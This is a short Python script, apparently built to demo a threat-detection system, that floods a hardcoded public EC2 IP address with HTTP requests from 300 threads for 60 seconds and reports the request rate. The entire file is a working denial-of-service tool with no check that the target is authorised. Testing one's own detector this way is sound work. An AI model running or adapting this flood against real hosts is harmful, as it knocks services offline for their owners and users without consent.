"""
DDoS Attack Simulator for Hybrid Threat Detection System Demo

This script simulates a DDoS attack by sending multiple concurrent
HTTP requests to the target EC2 instance.

Author: Aarit Haldar
Date: March 1, 2026
"""

import requests
import threading
import time
import sys

# Target EC2 instance
TARGET = "http://13.235.23.114"
DURATION = 60  # seconds
NUM_THREADS = 300  # Number of concurrent attackers

print("=" * 40)
print("    DDoS Attack Simulator")
print("=" * 40)
print(f"Target: {TARGET}")
print(f"Threads: {NUM_THREADS}")
print(f"Duration: {DURATION} seconds")
print("=" * 40)
print()

# Counter for successful requests
request_count = 0
request_lock = threading.Lock()

def flood():
    """Send continuous HTTP requests to target"""
    global request_count
    end_time = time.time() + DURATION
    local_count = 0
    
    while time.time() < end_time:
        try:
            requests.get(TARGET, timeout=0.2)
            local_count += 1
        except:
            pass
    
    with request_lock:
        request_count += local_count

print("Starting attack in 3 seconds...")
time.sleep(1)
print("3...")
time.sleep(1)
print("2...")
time.sleep(1)
print("1...")
print()
print("ATTACK STARTED!")
print()

start_time = time.time()
threads = []

# Start all attack threads
for i in range(NUM_THREADS):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)
    if (i + 1) % 50 == 0:
        print(f"Started {i + 1}/{NUM_THREADS} threads...")

print(f"All {NUM_THREADS} threads started!")
print()

# Show progress
for remaining in range(DURATION, 0, -10):
    print(f"Attack in progress... ({remaining} seconds remaining)")
    time.sleep(10)

# Wait for all threads to complete
for t in threads:
    t.join()

elapsed_time = time.time() - start_time

print()
print("=" * 40)
print("Attack completed!")
print("=" * 40)
print(f"Total requests sent: {request_count:,}")
print(f"Duration: {elapsed_time:.1f} seconds")
print(f"Average: {request_count/elapsed_time:.0f} requests/second")
print("=" * 40)
print()
print("Check the detection system terminal for threat detection!")
